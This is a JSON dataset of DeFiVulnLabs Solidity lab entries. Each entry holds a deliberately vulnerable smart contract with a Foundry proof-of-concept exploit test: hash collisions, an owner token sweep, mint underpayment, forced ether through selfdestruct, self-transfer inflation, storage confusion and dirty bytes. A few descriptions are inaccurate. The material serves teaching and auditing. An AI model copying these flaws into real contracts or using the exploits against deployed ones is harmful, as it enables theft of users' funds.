[
  {
    "id": "defivulnlabs_hash-collisions",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Hash-collisions.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.15;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: abi.encodePacked() Hash Collisions\n\nDescription:\nUsing abi.encodePacked() with multiple variable length arguments can, \nin certain situations, lead to a hash collision.\n\nHash functions are designed to be unique for each input, \nbut collisions can still occur due to limitations in the hash function's size or the sheer number of possible inputs. \nThis is a known issue mentioned:\nhttps://docs.soliditylang.org/en/v0.8.17/abi-spec.html?highlight=collisions#non-standard-packed-mode\n\nIn deposit function allows users to deposit Ether into the contract based on two string inputs: _string1 and _string2. \nThe contract uses the keccak256 function to generate a unique hash by concatenating these two strings.\n\nIf two different combinations of _string1 and _string2 produce the same hash value, a hash collision will occur. \nThe code does not handle this scenario properly and allows the second depositor to overwrite the previous deposit.\n\nMitigation: \nuse of abi.encode() instead of abi.encodePacked()\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1676476475191750656\nhttps://docs.soliditylang.org/en/v0.8.17/abi-spec.html?highlight=collisions#non-standard-packed-mode\nhttps://swcregistry.io/docs/SWC-133\nhttps://github.com/sherlock-audit/2022-10-nftport-judging/issues/118\n*/\n\ncontract ContractTest is Test {\n    HashCollisionBug HashCollisionBugContract;\n\n    function setUp() public {\n        HashCollisionBugContract = new HashCollisionBug();\n    }\n\n    function testHash_collisions() public {\n        emit log_named_bytes32(\n            \"(AAA,BBB) Hash\",\n            HashCollisionBugContract.createHash(\"AAA\", \"BBB\")\n        );\n        HashCollisionBugContract.deposit{value: 1 ether}(\"AAA\", \"BBB\");\n\n        emit log_named_bytes32(\n            \"(AA,ABBB) Hash\",\n            HashCollisionBugContract.createHash(\"AA\", \"ABBB\")\n        );\n        vm.expectRevert(\"Hash collision detected\");\n        HashCollisionBugContract.deposit{value: 1 ether}(\"AA\", \"ABBB\"); //Hash collision detected\n    }\n\n    receive() external payable {}\n}\n\ncontract HashCollisionBug {\n    mapping(bytes32 => uint256) public balances;\n\n    function createHash(\n        string memory _string1,\n        string memory _string2\n    ) public pure returns (bytes32) {\n        return keccak256(abi.encodePacked(_string1, _string2));\n    }\n\n    function deposit(\n        string memory _string1,\n        string memory _string2\n    ) external payable {\n        require(msg.value > 0, \"Deposit amount must be greater than zero\");\n\n        bytes32 hash = createHash(_string1, _string2);\n        // createHash(AAA, BBB) -> AAABBB\n        // createHash(AA, ABBB) -> AAABBB\n        // Check if the hash already exists in the balances mapping\n        require(balances[hash] == 0, \"Hash collision detected\");\n\n        balances[hash] = msg.value;\n    }\n}\n",
    "vulnerable_contract_only": "contract HashCollisionBug {\n    mapping(bytes32 => uint256) public balances;\n\n    function createHash(\n        string memory _string1,\n        string memory _string2\n    ) public pure returns (bytes32) {\n        return keccak256(abi.encodePacked(_string1, _string2));\n    }\n\n    function deposit(\n        string memory _string1,\n        string memory _string2\n    ) external payable {\n        require(msg.value > 0, \"Deposit amount must be greater than zero\");\n\n        bytes32 hash = createHash(_string1, _string2);\n        // createHash(AAA, BBB) -> AAABBB\n        // createHash(AA, ABBB) -> AAABBB\n        // Check if the hash already exists in the balances mapping\n        require(balances[hash] == 0, \"Hash collision detected\");\n\n        balances[hash] = msg.value;\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "abi.encodePacked() Hash Collisions",
    "description": "Using abi.encodePacked() with multiple variable length arguments can, \nin certain situations, lead to a hash collision.\n\nHash functions are designed to be unique for each input, \nbut collisions can still occur due to limitations in the hash function's size or the sheer number of possible inputs. \nThis is a known issue mentioned:\nhttps://docs.soliditylang.org/en/v0.8.17/abi-spec.html?highlight=collisions#non-standard-packed-mode\n\nIn deposit function allows users to deposit Ether into the contract based on two string inputs: _string1 and _string2. \nThe contract uses the keccak256 function to generate a unique hash by concatenating these two strings.\n\nIf two different combinations of _string1 and _string2 produce the same hash value, a hash collision will occur. \nThe code does not handle this scenario properly and allows the second depositor to overwrite the previous deposit.",
    "scenario": "",
    "fix_description": "use of abi.encode() instead of abi.encodePacked()",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Hash-collisions.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_recovererc20",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "recoverERC20.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n/*\nName: Incorrect implementation of the recoverERC20() function in the StakingRewards\n\nDescription:\nThe recoverERC20() function in StakingRewards.sol can potentially serve as a backdoor for the owner to retrieve rewardsToken.\nThere is no corresponding check against the rewardsToken. This creates an administrative privilege where the owner can sweep the rewards tokens, potentially using it as a means to exploit depositors.\nIt's similar to a forked issue if you forked vulnerable code.\n \nMitigation:  \ndisallowing recovery of the rewardToken within the recoverErc20 function\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1680806251482189824\nhttps://github.com/code-423n4/2022-02-concur-findings/issues/210\nhttps://github.com/code-423n4/2022-09-y2k-finance-findings/issues/49\nhttps://github.com/code-423n4/2022-10-paladin-findings/issues/40\nhttps://blog.openzeppelin.com/across-token-and-token-distributor-audit#anyone-can-prevent-stakers-from-getting-their-rewards\n*/\n\ncontract ContractTest is Test {\n    RewardToken RewardTokenContract;\n    VulnStakingRewards VulnStakingRewardsContract;\n    FixedtakingRewards FixedtakingRewardsContract;\n    address alice = vm.addr(1);\n\n    function setUp() public {\n        RewardTokenContract = new RewardToken();\n        VulnStakingRewardsContract = new VulnStakingRewards(\n            address(RewardTokenContract)\n        );\n        RewardTokenContract.transfer(address(alice), 10000 ether);\n        FixedtakingRewardsContract = new FixedtakingRewards(\n            address(RewardTokenContract)\n        );\n        //RewardTokenContract.transfer(address(alice),10000 ether);\n    }\n\n    function testVulnStakingRewards() public {\n        console.log(\n            \"Before rug RewardToken balance in VulnStakingRewardsContract\",\n            RewardTokenContract.balanceOf(address(this))\n        );\n        vm.prank(alice);\n        //If alice transfer reward token to VulnStakingRewardsContract\n        RewardTokenContract.transfer(\n            address(VulnStakingRewardsContract),\n            10000 ether\n        );\n        //admin can rug reward token over recoverERC20()\n        VulnStakingRewardsContract.recoverERC20(\n            address(RewardTokenContract),\n            1000 ether\n        );\n        console.log(\n            \"After rug RewardToken balance in VulnStakingRewardsContract\",\n            RewardTokenContract.balanceOf(address(this))\n        );\n    }\n\n    function testFixedStakingRewards() public {\n        console.log(\n            \"Before rug RewardToken balance in VulnStakingRewardsContract\",\n            RewardTokenContract.balanceOf(address(this))\n        );\n        vm.prank(alice);\n        //If alice transfer reward token to VulnStakingRewardsContract\n        RewardTokenContract.transfer(\n            address(FixedtakingRewardsContract),\n            10000 ether\n        );\n        FixedtakingRewardsContract.recoverERC20(\n            address(RewardTokenContract),\n            1000 ether\n        );\n        console.log(\n            \"After rug RewardToken balance in VulnStakingRewardsContract\",\n            RewardTokenContract.balanceOf(address(this))\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract VulnStakingRewards {\n    using SafeERC20 for IERC20;\n\n    IERC20 public rewardsToken;\n    address public owner;\n\n    event Recovered(address token, uint256 amount);\n\n    constructor(address _rewardsToken) {\n        rewardsToken = IERC20(_rewardsToken);\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only owner can call this function\");\n        _;\n    }\n\n    function recoverERC20(\n        address tokenAddress,\n        uint256 tokenAmount\n    ) public onlyOwner {\n        IERC20(tokenAddress).safeTransfer(owner, tokenAmount);\n        emit Recovered(tokenAddress, tokenAmount);\n    }\n}\n\ncontract FixedtakingRewards {\n    using SafeERC20 for IERC20;\n\n    IERC20 public rewardsToken;\n    address public owner;\n\n    event Recovered(address token, uint256 amount);\n\n    constructor(address _rewardsToken) {\n        rewardsToken = IERC20(_rewardsToken);\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only owner can call this function\");\n        _;\n    }\n\n    function recoverERC20(\n        address tokenAddress,\n        uint256 tokenAmount\n    ) external onlyOwner {\n        require(\n            tokenAddress != address(rewardsToken),\n            \"Cannot withdraw the rewardsToken\"\n        );\n        IERC20(tokenAddress).safeTransfer(owner, tokenAmount);\n        emit Recovered(tokenAddress, tokenAmount);\n    }\n}\n\ncontract RewardToken is ERC20, Ownable {\n    constructor() ERC20(\"Rewardoken\", \"Reward\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n}\n",
    "vulnerable_contract_only": "contract VulnStakingRewards {\n    using SafeERC20 for IERC20;\n\n    IERC20 public rewardsToken;\n    address public owner;\n\n    event Recovered(address token, uint256 amount);\n\n    constructor(address _rewardsToken) {\n        rewardsToken = IERC20(_rewardsToken);\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only owner can call this function\");\n        _;\n    }\n\n    function recoverERC20(\n        address tokenAddress,\n        uint256 tokenAmount\n    ) public onlyOwner {\n        IERC20(tokenAddress).safeTransfer(owner, tokenAmount);\n        emit Recovered(tokenAddress, tokenAmount);\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Incorrect implementation of the recoverERC20() function in the StakingRewards",
    "description": "The recoverERC20() function in StakingRewards.sol can potentially serve as a backdoor for the owner to retrieve rewardsToken.\nThere is no corresponding check against the rewardsToken. This creates an administrative privilege where the owner can sweep the rewards tokens, potentially using it as a means to exploit depositors.\nIt's similar to a forked issue if you forked vulnerable code.",
    "scenario": "",
    "fix_description": "disallowing recovery of the rewardToken within the recoverErc20 function",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "single_file",
    "original_source_path": "src/test/recoverERC20.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_immunefi_ch1",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Immunefi_ch1.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/utils/Counters.sol\";\n\n// Immunefi #spotthebugchallenge!\n// https://twitter.com/immunefi/status/1557301712549023745\n\ncontract ContractTest is Test {\n    HerToken HerTokenContract;\n\n    function testSafeMint() public {\n        HerTokenContract = new HerToken();\n\n        HerTokenContract.safeMint{value: 1 ether}(address(this), 10);\n        console.log(\n            \"Due to incorrect check msg.value, we can mint many NFTs with 1 Eth.\"\n        );\n        console.log(\"NFT minted:\", HerTokenContract.balanceOf(address(this)));\n    }\n\n    function onERC721Received(\n        address,\n        address,\n        uint256,\n        bytes memory\n    ) public returns (bytes4) {\n        //   HerTokenContract.safeMint{value: 1 ether}(address(this),30);\n        return this.onERC721Received.selector;\n    }\n\n    receive() external payable {}\n}\n\ncontract HerToken is ERC721, Ownable, Test {\n    uint128 constant MINT_PRICE = 1 ether;\n    uint128 constant MAX_SUPPLY = 10000;\n    uint mintIndex;\n    using Counters for Counters.Counter;\n    Counters.Counter private _tokenIdCounter;\n\n    constructor() payable ERC721(\"HarToken\", \"HRT\") {}\n\n    function safeMint(address to, uint256 amount) public payable {\n        require(\n            _tokenIdCounter.current() + amount < MAX_SUPPLY,\n            \"Cannot mint given amount.\"\n        );\n        require(amount > 0, \"Must give a mint amount.\");\n        //fix require(msg.value >= MINT_PRICE * amount, \"Insufficient Ether.\");\n        // before the loop\n        for (uint256 i = 0; i < amount; i++) {\n            require(msg.value >= MINT_PRICE, \"Insufficient Ether.\");\n\n            mintIndex = _tokenIdCounter.current();\n            console.log(\"mintIndex\", mintIndex);\n            _safeMint(to, mintIndex); // no reentrancy issue, because we can not control tokenid.\n            _tokenIdCounter.increment();\n        }\n    }\n}\n",
    "vulnerable_contract_only": "contract HerToken {\n    uint128 constant MINT_PRICE = 1 ether;\n    uint128 constant MAX_SUPPLY = 10000;\n    uint mintIndex;\n    using Counters for Counters.Counter;\n    Counters.Counter private _tokenIdCounter;\n\n    constructor() payable ERC721(\"HarToken\", \"HRT\") {}\n\n    function safeMint(address to, uint256 amount) public payable {\n        require(\n            _tokenIdCounter.current() + amount < MAX_SUPPLY,\n            \"Cannot mint given amount.\"\n        );\n        require(amount > 0, \"Must give a mint amount.\");\n        //fix require(msg.value >= MINT_PRICE * amount, \"Insufficient Ether.\");\n        // before the loop\n        for (uint256 i = 0; i < amount; i++) {\n            require(msg.value >= MINT_PRICE, \"Insufficient Ether.\");\n\n            mintIndex = _tokenIdCounter.current();\n            console.log(\"mintIndex\", mintIndex);\n            _safeMint(to, mintIndex); // no reentrancy issue, because we can not control tokenid.\n            _tokenIdCounter.increment();\n        }\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "",
    "description": "",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Immunefi_ch1.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_selfdestruct",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Selfdestruct.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Self-Destruct Vulnerability\n\nDescription:\nThe EtherGame Self-Destruct Vulnerability is a flaw in the smart contract code that allows an attacker \nto disrupt the game by causing the EtherGame contract to self-destruct (using the selfdestruct opcode). \nThe vulnerability arises due to the dos function in the Attack contract, which performs a self-destruct\noperation on the EtherGame contract after receiving a significant amount of Ether. As a result of the self-destruct, \nthe EtherGame contract's functionality is permanently disabled, making it impossible for anyone to deposit or claim the winner's reward.\n\nScenario:\n1. Deploy EtherGame\n2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.\n2. Deploy Attack with address of EtherGame\n3. Call Attack.attack sending 5 ether. This will break the game No one can become the winner.\n\nWhat happened?\nAttack forced the balance of EtherGame to equal 7 ether.\nNow no one can deposit and the winner cannot be set.\nDue to missing or insufficient access controls, malicious parties can self-destruct the contract.\nThe selfdestruct(address) function removes all bytecode from the contract address and sends all ether stored to the specified address.\n\nMitigation:\nInstead of relying on this.balance to track the deposited Ether, \nuse a state variable to keep track of the total deposited amount.\n*/\n\ncontract EtherGame {\n    uint public constant targetAmount = 7 ether;\n    address public winner;\n\n    function deposit() public payable {\n        require(msg.value == 1 ether, \"You can only send 1 Ether\");\n\n        uint balance = address(this).balance; // vulnerable\n        require(balance <= targetAmount, \"Game is over\");\n\n        if (balance == targetAmount) {\n            winner = msg.sender;\n        }\n    }\n\n    function claimReward() public {\n        require(msg.sender == winner, \"Not winner\");\n\n        (bool sent, ) = msg.sender.call{value: address(this).balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract ContractTest is Test {\n    EtherGame EtherGameContract;\n    Attack AttackerContract;\n    address alice;\n    address eve;\n\n    function setUp() public {\n        EtherGameContract = new EtherGame();\n        alice = vm.addr(1);\n        eve = vm.addr(2);\n        vm.deal(address(alice), 1 ether);\n        vm.deal(address(eve), 1 ether);\n    }\n\n    function testSelfdestruct() public {\n        console.log(\"Alice balance\", alice.balance);\n        console.log(\"Eve balance\", eve.balance);\n\n        console.log(\"Alice deposit 1 Ether...\");\n        vm.prank(alice);\n        EtherGameContract.deposit{value: 1 ether}();\n\n        console.log(\"Eve deposit 1 Ether...\");\n        vm.prank(eve);\n        EtherGameContract.deposit{value: 1 ether}();\n\n        console.log(\n            \"Balance of EtherGameContract\",\n            address(EtherGameContract).balance\n        );\n\n        console.log(\"Attack...\");\n        AttackerContract = new Attack(EtherGameContract);\n        AttackerContract.dos{value: 5 ether}();\n\n        console.log(\n            \"Balance of EtherGameContract\",\n            address(EtherGameContract).balance\n        );\n        console.log(\"Exploit completed, Game is over\");\n        EtherGameContract.deposit{value: 1 ether}(); // This call will fail due to contract destroyed.\n    }\n}\n\ncontract Attack {\n    EtherGame etherGame;\n\n    constructor(EtherGame _etherGame) {\n        etherGame = EtherGame(_etherGame);\n    }\n\n    function dos() public payable {\n        // You can simply break the game by sending ether so that\n        // the game balance >= 7 ether\n\n        // cast address to payable\n        address payable addr = payable(address(etherGame));\n        selfdestruct(addr);\n    }\n}\n",
    "vulnerable_contract_only": "contract EtherGame {\n    uint public constant targetAmount = 7 ether;\n    address public winner;\n\n    function deposit() public payable {\n        require(msg.value == 1 ether, \"You can only send 1 Ether\");\n\n        uint balance = address(this).balance; // vulnerable\n        require(balance <= targetAmount, \"Game is over\");\n\n        if (balance == targetAmount) {\n            winner = msg.sender;\n        }\n    }\n\n    function claimReward() public {\n        require(msg.sender == winner, \"Not winner\");\n\n        (bool sent, ) = msg.sender.call{value: address(this).balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "selfdestruct",
    "severity": "critical",
    "difficulty_tier": 2,
    "vulnerability_name": "Self-Destruct Vulnerability",
    "description": "The EtherGame Self-Destruct Vulnerability is a flaw in the smart contract code that allows an attacker \nto disrupt the game by causing the EtherGame contract to self-destruct (using the selfdestruct opcode). \nThe vulnerability arises due to the dos function in the Attack contract, which performs a self-destruct\noperation on the EtherGame contract after receiving a significant amount of Ether. As a result of the self-destruct, \nthe EtherGame contract's functionality is permanently disabled, making it impossible for anyone to deposit or claim the winner's reward.",
    "scenario": "1. Deploy EtherGame\n2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.\n2. Deploy Attack with address of EtherGame\n3. Call Attack.attack sending 5 ether. This will break the game No one can become the winner.\n\nWhat happened?\nAttack forced the balance of EtherGame to equal 7 ether.\nNow no one can deposit and the winner cannot be set.\nDue to missing or insufficient access controls, malicious parties can self-destruct the contract.\nThe selfdestruct(address) function removes all bytecode from the contract address and sends all ether stored to the specified address.",
    "fix_description": "Instead of relying on this.balance to track the deposited Ether, \nuse a state variable to keep track of the total deposited amount.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Selfdestruct.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_self-transfer",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "self-transfer.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Missing Check for Self-Transfer Allows Funds to be Lost\n\nDescription:\nThe vulnerability in the code stems from the absence of a check to prevent self-transfers. \nThis oversight allows the transfer function to erroneously transfer funds to the same address. \nConsequently, funds are lost as the code fails to deduct the transferred amount from the sender's balance.\nThis vulnerability undermines the correctness of fund transfers within the contract and poses a risk \nto the integrity of user balances.\n \nMitigation:  \nAdd condition to prevent transfer between same addresses\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1679373800327241728\nhttps://github.com/code-423n4/2022-10-traderjoe-findings/issues/299\nhttps://www.immunebytes.com/blog/bzxs-security-focused-relaunch-followed-by-a-hack-how/\n*/\n\ncontract ContractTest is Test {\n    SimpleBank VSimpleBankContract;\n    FixedSimpleBank FixedSimpleBankContract;\n\n    function setUp() public {\n        VSimpleBankContract = new SimpleBank();\n        FixedSimpleBankContract = new FixedSimpleBank();\n    }\n\n    function testSelfTransfer() public {\n        VSimpleBankContract.transfer(address(this), address(this), 10000);\n        VSimpleBankContract.transfer(address(this), address(this), 10000);\n        VSimpleBankContract.balanceOf(address(this));\n        /*\n        unchecked {\n        _balances[_id][Alice] = 10000 - 10000;\n        _balances[_id][Alice] = 10000 + 10000;\n         total balance of [Alice] = 20000\n        }\n        */\n    }\n\n    function testFixedSelfTransfer() public {\n        vm.expectRevert(\"Cannot transfer funds to the same address.\");\n        FixedSimpleBankContract.transfer(address(this), address(this), 10000);\n    }\n\n    receive() external payable {}\n}\n\ncontract SimpleBank {\n    mapping(address => uint256) private _balances;\n\n    function balanceOf(address _account) public view virtual returns (uint256) {\n        return _balances[_account];\n    }\n\n    function transfer(address _from, address _to, uint256 _amount) public {\n        // not check self-transfer\n        uint256 _fromBalance = _balances[_from];\n        uint256 _toBalance = _balances[_to];\n\n        unchecked {\n            _balances[_from] = _fromBalance - _amount;\n            _balances[_to] = _toBalance + _amount;\n        }\n    }\n}\n\ncontract FixedSimpleBank {\n    mapping(address => uint256) private _balances;\n\n    function balanceOf(address _account) public view virtual returns (uint256) {\n        return _balances[_account];\n    }\n\n    function transfer(address _from, address _to, uint256 _amount) public {\n        //Mitigation\n        require(_from != _to, \"Cannot transfer funds to the same address.\");\n\n        uint256 _fromBalance = _balances[_from];\n        uint256 _toBalance = _balances[_to];\n\n        unchecked {\n            _balances[_from] = _fromBalance - _amount;\n            _balances[_to] = _toBalance + _amount;\n            /*\n            Another mitigation\n            _balances[_id][_from] -= _amount;\n            _balances[_id][_to] += _amount;\n            */\n        }\n    }\n}\n",
    "vulnerable_contract_only": "contract SimpleBank {\n    mapping(address => uint256) private _balances;\n\n    function balanceOf(address _account) public view virtual returns (uint256) {\n        return _balances[_account];\n    }\n\n    function transfer(address _from, address _to, uint256 _amount) public {\n        // not check self-transfer\n        uint256 _fromBalance = _balances[_from];\n        uint256 _toBalance = _balances[_to];\n\n        unchecked {\n            _balances[_from] = _fromBalance - _amount;\n            _balances[_to] = _toBalance + _amount;\n        }\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Missing Check for Self-Transfer Allows Funds to be Lost",
    "description": "The vulnerability in the code stems from the absence of a check to prevent self-transfers. \nThis oversight allows the transfer function to erroneously transfer funds to the same address. \nConsequently, funds are lost as the code fails to deduct the transferred amount from the sender's balance.\nThis vulnerability undermines the correctness of fund transfers within the contract and poses a risk \nto the integrity of user balances.",
    "scenario": "",
    "fix_description": "Add condition to prevent transfer between same addresses",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "single_file",
    "original_source_path": "src/test/self-transfer.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_datalocation",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "DataLocation.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Data Location Confusion Vulnerability\n\nDescription:\nMisuse of storage and memory references of the user in the updaterewardDebt function.\n\nThe function updaterewardDebt is updating the rewardDebt value of a UserInfo struct \nthat is stored in memory. The issue is that this won't persist between function calls. \nAs soon as the function finishes executing, the memory is cleared and the changes are lost.\n\nMitigation:\nEnsure the correct usage of memory and storage in the function parameters. Make all the locations explicit.\n\nREF:\nhttps://mudit.blog/cover-protocol-hack-analysis-tokens-minted-exploit/\nhttps://www.educative.io/answers/storage-vs-memory-in-solidity\n\n*/\n\ncontract ContractTest is Test {\n    Array ArrayContract;\n\n    function testDataLocation() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        vm.deal(address(alice), 1 ether);\n        vm.deal(address(bob), 1 ether);\n        //vm.startPrank(alice);\n        ArrayContract = new Array();\n        ArrayContract.updaterewardDebt(100); // update rewardDebt to 100\n        (uint amount, uint rewardDebt) = ArrayContract.userInfo(address(this));\n        console.log(\"Non-updated rewardDebt\", rewardDebt);\n\n        console.log(\"Update rewardDebt with storage\");\n        ArrayContract.fixedupdaterewardDebt(100);\n        (uint newamount, uint newrewardDebt) = ArrayContract.userInfo(\n            address(this)\n        );\n        console.log(\"Updated rewardDebt\", newrewardDebt);\n    }\n\n    receive() external payable {}\n}\n\ncontract Array is Test {\n    mapping(address => UserInfo) public userInfo; // storage\n\n    struct UserInfo {\n        uint256 amount; // How many tokens got staked by user.\n        uint256 rewardDebt; // Reward debt. See Explanation below.\n    }\n\n    function updaterewardDebt(uint amount) public {\n        UserInfo memory user = userInfo[msg.sender]; // memory, vulnerable point\n        user.rewardDebt = amount;\n    }\n\n    function fixedupdaterewardDebt(uint amount) public {\n        UserInfo storage user = userInfo[msg.sender]; // storage\n        user.rewardDebt = amount;\n    }\n}\n",
    "vulnerable_contract_only": "contract Array {\n    mapping(address => UserInfo) public userInfo; // storage\n\n    struct UserInfo {\n        uint256 amount; // How many tokens got staked by user.\n        uint256 rewardDebt; // Reward debt. See Explanation below.\n    }\n\n    function updaterewardDebt(uint amount) public {\n        UserInfo memory user = userInfo[msg.sender]; // memory, vulnerable point\n        user.rewardDebt = amount;\n    }\n\n    function fixedupdaterewardDebt(uint amount) public {\n        UserInfo storage user = userInfo[msg.sender]; // storage\n        user.rewardDebt = amount;\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "storage_misuse",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Data Location Confusion Vulnerability",
    "description": "Misuse of storage and memory references of the user in the updaterewardDebt function.\n\nThe function updaterewardDebt is updating the rewardDebt value of a UserInfo struct \nthat is stored in memory. The issue is that this won't persist between function calls. \nAs soon as the function finishes executing, the memory is cleared and the changes are lost.",
    "scenario": "",
    "fix_description": "Ensure the correct usage of memory and storage in the function parameters. Make all the locations explicit.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/DataLocation.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_dirtybytes",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Dirtybytes.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.0;\n// the issue is fixed in 0.8.15\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Dirtybytes in > Solidity 0.8.15\n    \"description\": \"Copying ``bytes`` arrays from memory or calldata to storage is done in chunks of 32 bytes even if the length is not a multiple of 32. \n    Thereby, extra bytes past the end of the array may be copied from calldata or memory to storage. \n    These dirty bytes may then become observable after a ``.push()`` without arguments to the bytes array in storage,\n    i.e. such a push will not result in a zero value at the end of the array as expected. \n    This bug only affects the legacy code generation pipeline, the new code generation pipeline via IR is not affected.\"\n    \n    \"link\": https://blog.soliditylang.org/2022/06/15/dirty-bytes-array-to-storage-bug/\n    \"fixed\": 0.8.15\n\n*/\n\ncontract ContractTest is Test {\n    Dirtybytes Dirtybytesontract;\n\n    function testDirtybytes() public {\n        Dirtybytesontract = new Dirtybytes();\n        emit log_named_bytes(\n            \"Array element in h() not being zero::\",\n            Dirtybytesontract.h()\n        );\n        console.log(\n            \"Such that the byte after the 63 bytes allocated below will be 0x02.\"\n        );\n    }\n}\n\ncontract Dirtybytes {\n    event ev(uint[], uint);\n    bytes s;\n\n    constructor() {\n        // The following event emission involves writing to temporary memory at the current location\n        // of the free memory pointer. Several other operations (e.g. certain keccak256 calls) will\n        // use temporary memory in a similar manner.\n        // In this particular case, the length of the passed array will be written to temporary memory\n        // exactly such that the byte after the 63 bytes allocated below will be 0x02. This dirty byte\n        // will then be written to storage during the assignment and become visible with the push in ``h``.\n        emit ev(new uint[](2), 0);\n        bytes memory m = new bytes(63);\n        s = m;\n    }\n\n    function h() external returns (bytes memory) {\n        s.push();\n        return s;\n    }\n}\n",
    "vulnerable_contract_only": "contract Dirtybytes {\n    event ev(uint[], uint);\n    bytes s;\n\n    constructor() {\n        // The following event emission involves writing to temporary memory at the current location\n        // of the free memory pointer. Several other operations (e.g. certain keccak256 calls) will\n        // use temporary memory in a similar manner.\n        // In this particular case, the length of the passed array will be written to temporary memory\n        // exactly such that the byte after the 63 bytes allocated below will be 0x02. This dirty byte\n        // will then be written to storage during the assignment and become visible with the push in ``h``.\n        emit ev(new uint[](2), 0);\n        bytes memory m = new bytes(63);\n        s = m;\n    }\n\n    function h() external returns (bytes memory) {\n        s.push();\n        return s;\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 2,
    "vulnerability_name": "Dirtybytes in > Solidity 0.8.15",
    "description": "Dirtybytes in > Solidity 0.8.15",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "src/test/Dirtybytes.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_randomness",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Randomness.sol",
